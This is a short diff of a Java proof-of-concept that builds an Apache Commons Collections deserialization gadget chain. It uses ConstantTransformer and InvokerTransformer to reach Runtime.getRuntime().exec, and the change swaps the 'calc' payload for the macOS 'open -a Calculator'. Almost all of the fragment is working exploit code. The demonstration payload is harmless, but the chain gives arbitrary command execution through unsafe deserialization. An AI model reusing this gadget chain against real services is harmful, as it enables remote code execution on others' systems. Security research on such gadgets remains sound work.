@@ -18,7 +18,7 @@ public class Main {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"}),
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
         HashMap<Object, Object> hashMap = new HashMap<>();
